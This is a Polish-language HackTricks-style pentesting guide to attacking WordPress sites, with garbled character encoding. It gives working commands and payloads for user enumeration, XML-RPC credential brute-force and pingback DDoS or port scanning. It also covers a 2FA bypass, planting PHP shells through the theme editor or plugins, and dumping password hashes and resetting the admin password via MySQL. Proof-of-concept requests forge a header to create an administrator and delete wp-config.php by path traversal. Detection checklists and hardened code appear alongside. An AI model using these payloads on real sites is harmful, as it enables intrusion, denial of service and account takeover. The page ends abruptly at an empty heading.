# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

- **Uploaded** pliki trafiajÄ… do: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** wiÄ™c jeÅ›li zmienisz jakiÅ› plik php motywu, aby uzyskaÄ‡ RCE, prawdopodobnie bÄ™dziesz uÅ¼ywaÄ‡ tej Å›cieÅ¼ki. Na przykÅ‚ad: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- W pliku **wp-config.php** moÅ¼esz znaleÅºÄ‡ hasÅ‚o root do bazy danych.
- DomyÅ›lne Å›cieÅ¼ki logowania do sprawdzenia: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **GÅ‚Ã³wne pliki WordPress**

- `index.php`
- `license.txt` zawiera przydatne informacje, takie jak zainstalowana wersja WordPress.
- `wp-activate.php` jest uÅ¼ywany w procesie aktywacji przez e-mail podczas zakÅ‚adania nowej strony WordPress.
- Foldery logowania (mogÄ… byÄ‡ przemianowane, aby je ukryÄ‡):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` to plik reprezentujÄ…cy funkcjÄ™ WordPress, ktÃ³ra umoÅ¼liwia przesyÅ‚anie danych z HTTP jako mechanizmem transportu i XML jako mechanizmem kodowania. Tego typu komunikacja zostaÅ‚a zastÄ…piona przez WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- Folder `wp-content` jest gÅ‚Ã³wnym katalogiem, w ktÃ³rym przechowywane sÄ… wtyczki i motywy.
- `wp-content/uploads/` jest katalogiem, w ktÃ³rym przechowywane sÄ… wszystkie pliki przesÅ‚ane na platformÄ™.
- `wp-includes/` to katalog, w ktÃ³rym przechowywane sÄ… pliki rdzenia, takie jak certyfikaty, czcionki, pliki JavaScript i widÅ¼ety.
- `wp-sitemap.xml` W wersjach WordPress 5.5 i wyÅ¼szych, WordPress generuje plik sitemap XML ze wszystkimi publicznymi wpisami oraz publicznie zapytalnymi typami wpisÃ³w i taksonomiami.

**Post exploitation**

- Plik `wp-config.php` zawiera informacje wymagane przez WordPress do poÅ‚Ä…czenia z bazÄ… danych, takie jak nazwa bazy danych, host bazy danych, nazwa uÅ¼ytkownika i hasÅ‚o, klucze uwierzytelniania i salty oraz prefiks tabel bazy danych. Ten plik konfiguracyjny moÅ¼e byÄ‡ rÃ³wnieÅ¼ uÅ¼yty do wÅ‚Ä…czenia trybu DEBUG, co moÅ¼e byÄ‡ pomocne przy rozwiÄ…zywaniu problemÃ³w.

### Uprawnienia uÅ¼ytkownikÃ³w

- **Administrator**
- **Editor**: Publikuje i zarzÄ…dza wÅ‚asnymi i cudzymi wpisami
- **Author**: Publikuje i zarzÄ…dza wyÅ‚Ä…cznie wÅ‚asnymi wpisami
- **Contributor**: Pisze i zarzÄ…dza swoimi wpisami, ale nie moÅ¼e ich publikowaÄ‡
- **Subscriber**: PrzeglÄ…da wpisy i edytuje swÃ³j profil

## **Passive Enumeration**

### **Get WordPress version**

SprawdÅº, czy moÅ¼esz znaleÅºÄ‡ pliki `/license.txt` lub `/readme.html`

W **kodzie ÅºrÃ³dÅ‚owym** strony (przykÅ‚ad z [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Pliki linkÃ³w CSS

![](<../../images/image (533).png>)

- Pliki JavaScript

![](<../../images/image (524).png>)

### Pobierz wtyczki
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Pobierz motywy
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Wydobywanie wersji â€” ogÃ³lnie
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Aktywna enumeracja

### Wtyczki i motywy

Prawdopodobnie nie bÄ™dziesz w stanie znaleÅºÄ‡ wszystkich dostÄ™pnych wtyczek i motywÃ³w. Aby odkryÄ‡ je wszystkie, bÄ™dziesz musiaÅ‚ **aktywnie Brute Force listÄ™ wtyczek i motywÃ³w** (mamy nadziejÄ™, Å¼e istniejÄ… zautomatyzowane narzÄ™dzia, ktÃ³re zawierajÄ… te listy).

### UÅ¼ytkownicy

- **ID Brute:** Uzyskujesz waÅ¼nych uÅ¼ytkownikÃ³w z serwisu WordPress poprzez Brute Forcing ID uÅ¼ytkownikÃ³w:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
JeÅ›li odpowiedzi majÄ… status **200** lub **30X**, oznacza to, Å¼e id jest **prawidÅ‚owe**. JeÅ›li odpowiedÅº ma status **400**, wtedy id jest **nieprawidÅ‚owe**.

- **wp-json:** MoÅ¼esz rÃ³wnieÅ¼ sprÃ³bowaÄ‡ uzyskaÄ‡ informacje o uÅ¼ytkownikach, wysyÅ‚ajÄ…c zapytanie:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
Kolejny endpoint `/wp-json/`, ktÃ³ry moÅ¼e ujawniÄ‡ pewne informacje o uÅ¼ytkownikach, to:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
ZwrÃ³Ä‡ uwagÄ™, Å¼e ten endpoint ujawnia tylko uÅ¼ytkownikÃ³w, ktÃ³rzy opublikowali post. **Dostarczone zostanÄ… tylko informacje o uÅ¼ytkownikach, ktÃ³rzy majÄ… wÅ‚Ä…czonÄ… tÄ™ funkcjÄ™**.

ZwrÃ³Ä‡ teÅ¼ uwagÄ™, Å¼e **/wp-json/wp/v2/pages** moÅ¼e leak IP addresses.

- **Login username enumeration**: Podczas logowania przez **`/wp-login.php`** **komunikat** jest **inny** i wskazuje, czy **nazwa uÅ¼ytkownika istnieje, czy nie**.

### XML-RPC

JeÅ›li `xml-rpc.php` jest aktywny, moÅ¼esz przeprowadziÄ‡ credentials brute-force lub uÅ¼yÄ‡ go do przeprowadzenia DoS attacks na inne zasoby. (MoÅ¼esz zautomatyzowaÄ‡ ten proces, na przykÅ‚ad uÅ¼ywajÄ…c [tego](https://github.com/relarizky/wpxploit)).

Aby sprawdziÄ‡, czy jest aktywny, sprÃ³buj uzyskaÄ‡ dostÄ™p do _**/xmlrpc.php**_ i wyÅ›lij to Å¼Ä…danie:

**SprawdÅº**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** lub **`metaWeblog.getUsersBlogs`** to niektÃ³re z metod, ktÃ³re mogÄ… byÄ‡ uÅ¼yte do brute-force credentials. JeÅ›li znajdziesz ktÃ³rÄ…kolwiek z nich, moÅ¼esz wysÅ‚aÄ‡ coÅ› takiego:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Komunikat _"Incorrect username or password"_ w odpowiedzi z kodem 200 powinien pojawiÄ‡ siÄ™, jeÅ›li dane uwierzytelniajÄ…ce sÄ… nieprawidÅ‚owe.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

UÅ¼ywajÄ…c prawidÅ‚owych danych uwierzytelniajÄ…cych moÅ¼esz przesÅ‚aÄ‡ plik. W odpowiedzi pojawi siÄ™ Å›cieÅ¼ka ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Jest teÅ¼ **szybszy sposÃ³b** na brute-force credentials uÅ¼ywajÄ…c **`system.multicall`**, poniewaÅ¼ moÅ¼esz sprÃ³bowaÄ‡ kilku creds w tym samym Å¼Ä…daniu:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Omijanie 2FA**

Ta metoda jest przeznaczona dla programÃ³w, nie dla ludzi, i jest stara, wiÄ™c nie obsÅ‚uguje 2FA. JeÅ›li masz waÅ¼ne creds, ale gÅ‚Ã³wne wejÅ›cie jest chronione przez 2FA, **moÅ¼esz naduÅ¼yÄ‡ xmlrpc.php, aby zalogowaÄ‡ siÄ™ tymi creds, omijajÄ…c 2FA**. ZwrÃ³Ä‡ uwagÄ™, Å¼e nie bÄ™dziesz w stanie wykonaÄ‡ wszystkich akcji dostÄ™pnych przez konsolÄ™, ale nadal moÅ¼esz uzyskaÄ‡ RCE, jak Ippsec wyjaÅ›nia w [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS lub skanowanie portÃ³w**

JeÅ›li znajdziesz metodÄ™ _**pingback.ping**_ na liÅ›cie, moÅ¼esz sprawiÄ‡, Å¼e Wordpress wyÅ›le dowolne Å¼Ä…danie do dowolnego host/port.\
MoÅ¼e to posÅ‚uÅ¼yÄ‡ do zmuszenia **tysiÄ™cy** Wordpress **sites** do **access** jednej **location** (w ten sposÃ³b wywoÅ‚ujÄ…c **DDoS** w tej lokalizacji), albo moÅ¼esz uÅ¼yÄ‡ tego, aby sprawiÄ‡, Å¼e **Wordpress** przeskanuje jakÄ…Å› wewnÄ™trznÄ… **network** (moÅ¼esz wskazaÄ‡ dowolny port).
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

JeÅ›li otrzymasz **faultCode** o wartoÅ›ci **wiÄ™kszej** niÅ¼ **0** (17), oznacza to, Å¼e port jest otwarty.

ZwrÃ³Ä‡ uwagÄ™ na uÅ¼ycie **`system.multicall`** w poprzedniej sekcji, aby dowiedzieÄ‡ siÄ™, jak naduÅ¼yÄ‡ tej metody, aby spowodowaÄ‡ DDoS.

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

Ten plik zwykle znajduje siÄ™ w katalogu root strony Wordpress: **`/wp-cron.php`**\
Gdy ten plik jest **wywoÅ‚ywany**, wykonywane jest â€ciÄ™Å¼kieâ€ zapytanie MySQL, wiÄ™c moÅ¼e byÄ‡ uÅ¼yty przez **atakujÄ…cych** do **wywoÅ‚ania** **DoS**.\
Ponadto, domyÅ›lnie `wp-cron.php` jest wywoÅ‚ywany przy kaÅ¼dym Å‚adowaniu strony (za kaÅ¼dym razem, gdy klient Å¼Ä…da dowolnej strony Wordpress), co przy duÅ¼ym ruchu moÅ¼e powodowaÄ‡ problemy (DoS).

Zaleca siÄ™ wyÅ‚Ä…czenie Wp-Cron i utworzenie prawdziwego zadania cron na hoÅ›cie, ktÃ³re bÄ™dzie wykonywaÄ‡ potrzebne akcje w regularnych odstÄ™pach (bez powodowania problemÃ³w).

### /wp-json/oembed/1.0/proxy - SSRF

SprÃ³buj uzyskaÄ‡ dostÄ™p do _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ i strona Worpress moÅ¼e wykonaÄ‡ Å¼Ä…danie do Ciebie.

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

To narzÄ™dzie sprawdza, czy istnieje **methodName: pingback.ping** oraz Å›cieÅ¼ka **/wp-json/oembed/1.0/proxy**, i jeÅ›li tak, prÃ³buje je exploitowaÄ‡.

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## Uzyskaj dostÄ™p przez nadpisanie jednego bitu

To bardziej ciekawostka niÅ¼ prawdziwy atak. W CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) moÅ¼na byÅ‚o odwrÃ³ciÄ‡ 1 bit w dowolnym pliku wordpress. Tak wiÄ™c moÅ¼na byÅ‚o zmieniÄ‡ bit na pozycji `5389` w pliku `/var/www/html/wp-includes/user.php`, aby zamieniÄ‡ operacjÄ™ NOT (`!`) na NOP.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**Modyfikacja pliku php z uÅ¼ywanego motywu (wymagane dane logowania administratora)**

WyglÄ…d â†’ Edytor motywu â†’ Szablon 404 (po prawej)

ZmieÅ„ zawartoÅ›Ä‡ na php shell:

![](<../../images/image (384).png>)

Wyszukaj w internecie, jak uzyskaÄ‡ dostÄ™p do tej zaktualizowanej strony. W tym przypadku musisz wejÅ›Ä‡ tutaj: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

MoÅ¼esz uÅ¼yÄ‡:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
aby uzyskaÄ‡ sesjÄ™.

## Plugin RCE

### PHP plugin

MoÅ¼e byÄ‡ moÅ¼liwe przesÅ‚anie plikÃ³w .php jako plugin.\
UtwÃ³rz swÃ³j php backdoor uÅ¼ywajÄ…c na przykÅ‚ad:

![](<../../images/image (183).png>)

NastÄ™pnie dodaj nowy plugin:

![](<../../images/image (722).png>)

PrzeÅ›lij plugin i naciÅ›nij Install Now:

![](<../../images/image (249).png>)

Kliknij na Procced:

![](<../../images/image (70).png>)

Prawdopodobnie nic siÄ™ nie stanie, ale jeÅ›li przejdziesz do Media, zobaczysz przesÅ‚any shell:

![](<../../images/image (462).png>)

OtwÃ³rz go i zobaczysz URL do uruchomienia reverse shell:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

Ta metoda polega na zainstalowaniu malicious plugin znanego z podatnoÅ›ci, ktÃ³ry moÅ¼e zostaÄ‡ wykorzystany do uzyskania web shell. Proces wykonywany jest przez WordPress dashboard w nastÄ™pujÄ…cy sposÃ³b:

1. **Plugin Acquisition**: plugin jest pobierany ze ÅºrÃ³dÅ‚a takiego jak Exploit DB, na przykÅ‚ad [**here**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- PrzejdÅº do WordPress dashboard, nastÄ™pnie do `Dashboard > Plugins > Upload Plugin`.
- PrzeÅ›lij plik zip pobranego pluginu.
3. **Plugin Activation**: Po pomyÅ›lnej instalacji plugin musi zostaÄ‡ aktywowany przez dashboard.
4. **Exploitation**:
- Po zainstalowaniu i aktywowaniu pluginu "reflex-gallery" moÅ¼na go exploitowaÄ‡, poniewaÅ¼ jest znany z podatnoÅ›ci.
- Framework Metasploit dostarcza exploit dla tej podatnoÅ›ci. ÅadujÄ…c odpowiedni moduÅ‚ i wykonujÄ…c konkretne polecenia moÅ¼na uzyskaÄ‡ sesjÄ™ meterpreter, co daje nieautoryzowany dostÄ™p do strony.
- NaleÅ¼y pamiÄ™taÄ‡, Å¼e jest to tylko jedna z wielu metod wykorzystania podatnoÅ›ci w WordPress.

ZawartoÅ›Ä‡ zawiera materiaÅ‚y wizualne przedstawiajÄ…ce kroki w dashboardzie WordPress dotyczÄ…ce instalacji i aktywacji pluginu. NaleÅ¼y jednak pamiÄ™taÄ‡, Å¼e wykorzystywanie podatnoÅ›ci w ten sposÃ³b jest nielegalne i nieetyczne bez odpowiedniej autoryzacji. Informacje te powinny byÄ‡ uÅ¼ywane odpowiedzialnie i tylko w kontekÅ›cie prawnym, takim jak penetration testing z wyraÅºnÄ… zgodÄ….

**For more detailed steps check:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_ is a script designed to escalate a **Cross-Site Scripting (XSS)** vulnerability to **Remote Code Execution (RCE)** or other's criticals vulnerabilities in WordPress. For more info check [**this post**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html). It provides **support for Wordpress Versions 6.X.X, 5.X.X and 4.X.X. and allows to:**
- _**Privilege Escalation:**_ Tworzy uÅ¼ytkownika w WordPress.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ PrzeÅ›lij swÃ³j custom plugin (backdoor) do WordPress.
- _**(RCE) Built-In Plugin Edit:**_ Edytuj wbudowane pluginy w WordPress.
- _**(RCE) Built-In Theme Edit:**_ Edytuj wbudowane motywy w WordPress.
- _**(Custom) Custom Exploits:**_ Custom Exploits dla third-party WordPress Plugins/Themes.

## Post Exploitation

WyodrÄ™bnij nazwy uÅ¼ytkownikÃ³w i hasÅ‚a:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
ZmieÅ„ hasÅ‚o administratora:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress Plugins Pentest

### Powierzchnia ataku

ZnajomoÅ›Ä‡ sposobÃ³w, w jakie wtyczka Wordpress moÅ¼e ujawniaÄ‡ funkcjonalnoÅ›ci, jest kluczowa, aby znaleÅºÄ‡ podatnoÅ›ci w jej dziaÅ‚aniu. PoniÅ¼ej znajdziesz, w jaki sposÃ³b wtyczka moÅ¼e ujawniaÄ‡ funkcjonalnoÅ›ci, oraz przykÅ‚ady podatnych wtyczek w [**this blog post**](https://nowotarski.info/wordpress-nonce-authorization/).

- **`wp_ajax`**

Jednym ze sposobÃ³w, w jaki wtyczka moÅ¼e udostÄ™pniaÄ‡ funkcje uÅ¼ytkownikom, sÄ… obsÅ‚ugiwacze AJAX. MogÄ… one zawieraÄ‡ bÅ‚Ä™dy w logice, autoryzacji lub uwierzytelnianiu. Co wiÄ™cej, czÄ™sto bywa tak, Å¼e te funkcje opierajÄ… zarÃ³wno uwierzytelnianie, jak i autoryzacjÄ™ na istnieniu Wordpress nonce, ktÃ³re **kaÅ¼dy uwierzytelniony uÅ¼ytkownik instancji Wordpress moÅ¼e posiadaÄ‡** (niezaleÅ¼nie od jego roli).

Oto funkcje, ktÃ³re mogÄ… byÄ‡ uÅ¼yte do udostÄ™pnienia funkcji w wtyczce:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**UÅ¼ycie `nopriv` sprawia, Å¼e endpoint jest dostÄ™pny dla wszystkich uÅ¼ytkownikÃ³w (nawet niezalogowanych).**

> [!CAUTION]
> Ponadto, jeÅ›li funkcja sprawdza autoryzacjÄ™ uÅ¼ytkownika tylko za pomocÄ… funkcji `wp_verify_nonce`, ta funkcja jedynie sprawdza, czy uÅ¼ytkownik jest zalogowany; zazwyczaj nie sprawdza roli uÅ¼ytkownika. W rezultacie uÅ¼ytkownicy o niskich uprawnieniach mogÄ… mieÄ‡ dostÄ™p do akcji wymagajÄ…cych wyÅ¼szych uprawnieÅ„.

- **REST API**

MoÅ¼liwe jest teÅ¼ wystawienie funkcji z wordpressa poprzez zarejestrowanie REST API przy uÅ¼yciu funkcji `register_rest_route`:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
The `permission_callback` jest funkcjÄ… wywoÅ‚ywanÄ… (callbackiem), ktÃ³ra sprawdza, czy dany uÅ¼ytkownik jest uprawniony do wywoÅ‚ania metody API.

**JeÅ›li uÅ¼yta jest wbudowana funkcja `__return_true`, po prostu pominie ona sprawdzenie uprawnieÅ„ uÅ¼ytkownika.**

- **BezpoÅ›redni dostÄ™p do pliku PHP**

OczywiÅ›cie Wordpress uÅ¼ywa PHP, a pliki wewnÄ…trz wtyczek sÄ… bezpoÅ›rednio dostÄ™pne z sieci. JeÅ›li wtyczka ujawnia jakÄ…Å› podatnÄ… funkcjonalnoÅ›Ä‡, ktÃ³ra jest wywoÅ‚ywana jedynie przez dostÄ™p do pliku, bÄ™dzie ona wykorzystywalna przez dowolnego uÅ¼ytkownika.

### Trusted-header REST impersonation (WooCommerce Payments â‰¤ 5.6.1)

NiektÃ³re wtyczki implementujÄ… â€trusted headerâ€ skrÃ³ty dla integracji wewnÄ™trznych lub reverse proxies i nastÄ™pnie uÅ¼ywajÄ… tego headera do ustawiania kontekstu bieÅ¼Ä…cego uÅ¼ytkownika dla Å¼Ä…daÅ„ REST. JeÅ›li header nie jest kryptograficznie powiÄ…zany z Å¼Ä…daniem przez komponent upstream, atakujÄ…cy moÅ¼e go sfaÅ‚szowaÄ‡ i wywoÅ‚aÄ‡ uprzywilejowane trasy REST jako administrator.

- WpÅ‚yw: eskalacja uprawnieÅ„ bez uwierzytelnienia do roli administratora poprzez utworzenie nowego administratora za pomocÄ… core users REST route.
- Example header: `X-Wcpay-Platform-Checkout-User: 1` (wymusza ID uÅ¼ytkownika 1, zazwyczaj pierwsze konto administratora).
- Wyeksploatowana trasa: `POST /wp-json/wp/v2/users` z podwyÅ¼szonÄ… tablicÄ… rÃ³l.

PoC
```http
POST /wp-json/wp/v2/users HTTP/1.1
Host: <WP HOST>
User-Agent: Mozilla/5.0
Accept: application/json
Content-Type: application/json
X-Wcpay-Platform-Checkout-User: 1
Content-Length: 114

{"username": "honeypot", "email": "wafdemo@patch.stack", "password": "demo", "roles": ["administrator"]}
```
Dlaczego to dziaÅ‚a

- The plugin maps a client-controlled header to authentication state and skips capability checks.
- WordPress core expects `create_users` capability for this route; the plugin hack bypasses it by directly setting the current user context from the header.

Oczekiwane wskaÅºniki sukcesu

- HTTP 201 z ciaÅ‚em JSON opisujÄ…cym utworzonego uÅ¼ytkownika.
- Nowy uÅ¼ytkownik z uprawnieniami administratora widoczny w `wp-admin/users.php`.

Lista kontrolna wykrywania

- Grep for `getallheaders()`, `$_SERVER['HTTP_...']`, or vendor SDKs that read custom headers to set user context (e.g., `wp_set_current_user()`, `wp_set_auth_cookie()`).
- Przejrzyj rejestracje REST pod kÄ…tem uprzywilejowanych callbackÃ³w, ktÃ³re nie majÄ… solidnych sprawdzeÅ„ `permission_callback` i zamiast tego polegajÄ… na nagÅ‚Ã³wkach Å¼Ä…dania.
- Szukaj uÅ¼yÄ‡ funkcji rdzenia do zarzÄ…dzania uÅ¼ytkownikami (`wp_insert_user`, `wp_create_user`) wewnÄ…trz REST handlers, ktÃ³re sÄ… ograniczone wyÅ‚Ä…cznie przez wartoÅ›ci nagÅ‚Ã³wkÃ³w.

Wzmocnienie

- Nigdy nie wyprowadzaj uwierzytelnienia ani autoryzacji z nagÅ‚Ã³wkÃ³w kontrolowanych przez klienta.
- JeÅ›li reverse proxy musi wstrzyknÄ…Ä‡ identity, zakoÅ„cz zaufanie na proxy i usuÅ„ przychodzÄ…ce kopie (np. `unset X-Wcpay-Platform-Checkout-User` na krawÄ™dzi), nastÄ™pnie przekaÅ¼ podpisany token i zweryfikuj go po stronie serwera.
- Dla tras REST wykonujÄ…cych uprzywilejowane akcje wymagaj sprawdzeÅ„ `current_user_can()` oraz rygorystycznego `permission_callback` (NIE uÅ¼ywaj `__return_true`).
- Preferuj first-party auth (cookies, application passwords, OAuth) zamiast header â€œimpersonationâ€.

References: see the links at the end of this page for a public case and broader analysis.

### Unauthenticated Arbitrary File Deletion via wp_ajax_nopriv (Litho Theme <= 3.0)

WordPress themes and plugins frequently expose AJAX handlers through the `wp_ajax_` and `wp_ajax_nopriv_` hooks.  When the **_nopriv_** variant is used **the callback becomes reachable by unauthenticated visitors**, so any sensitive action must additionally implement:

1. A **capability check** (e.g. `current_user_can()` or at least `is_user_logged_in()`), and
2. A **CSRF nonce** validated with `check_ajax_referer()` / `wp_verify_nonce()`, and
3. **Strict input sanitisation / validation**.

The Litho multipurpose theme (< 3.1) forgot those 3 controls in the *Remove Font Family* feature and ended up shipping the following code (simplified):
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
Problemy wprowadzone przez ten fragment:

* **Unauthenticated access** â€“ zarejestrowano hook `wp_ajax_nopriv_`.
* **No nonce / capability check** â€“ kaÅ¼dy odwiedzajÄ…cy moÅ¼e wywoÅ‚aÄ‡ endpoint.
* **No path sanitisation** â€“ kontrolowany przez uÅ¼ytkownika ciÄ…g `fontfamily` jest konkatenowany do Å›cieÅ¼ki systemu plikÃ³w bez filtrowania, co umoÅ¼liwia klasyczny `../../` traversal.

#### Exploitation

AtakujÄ…cy moÅ¼e usunÄ…Ä‡ dowolny plik lub katalog **poniÅ¼ej bazowego katalogu uploads** (zwykle `<wp-root>/wp-content/uploads/`) wysyÅ‚ajÄ…c jedno Å¼Ä…danie HTTP POST:
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
PoniewaÅ¼ `wp-config.php` znajduje siÄ™ poza *uploads*, cztery sekwencje `../` wystarczÄ… w domyÅ›lnej instalacji. UsuniÄ™cie `wp-config.php` wymusza na WordPress przejÅ›cie do *kreatora instalacji* przy kolejnej wizycie, umoÅ¼liwiajÄ…c peÅ‚ne przejÄ™cie strony (atakujÄ…cy jedynie podaje nowÄ… konfiguracjÄ™ DB i tworzy uÅ¼ytkownika admina).

Inne istotne cele to pliki plugin/theme `.php` (np. w celu wyÅ‚Ä…czenia security plugins) lub reguÅ‚y `.htaccess`.

#### Lista kontrolna wykrywania

* KaÅ¼de wywoÅ‚anie zwrotne `add_action( 'wp_ajax_nopriv_...')`, ktÃ³re wywoÅ‚uje funkcje pomocnicze systemu plikÃ³w (`copy()`, `unlink()`, `$wp_filesystem->delete()`, itp.).
* Konkatenacja niesanitizowanych danych wejÅ›ciowych uÅ¼ytkownika w Å›cieÅ¼ki (szukaj `$_POST`, `$_GET`, `$_REQUEST`).
* Brak `check_ajax_referer()` oraz `current_user_can()`/`is_user_logged_in()`.

#### Zabezpieczenia
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **Zawsze** traktuj kaÅ¼dÄ… operacjÄ™ zapisu/usuniÄ™cia na dysku jako uprzywilejowanÄ… i dokÅ‚adnie sprawdÅº:
> â€¢ Authentication  â€¢ Authorisation  â€¢ Nonce  â€¢ Input sanitisation  â€¢ Path containment (e.g. via `realpath()` plus `str_starts_with()`).

---

### Privilege escalation via stale role restoration and missing authorization (ASE "View Admin as Role")

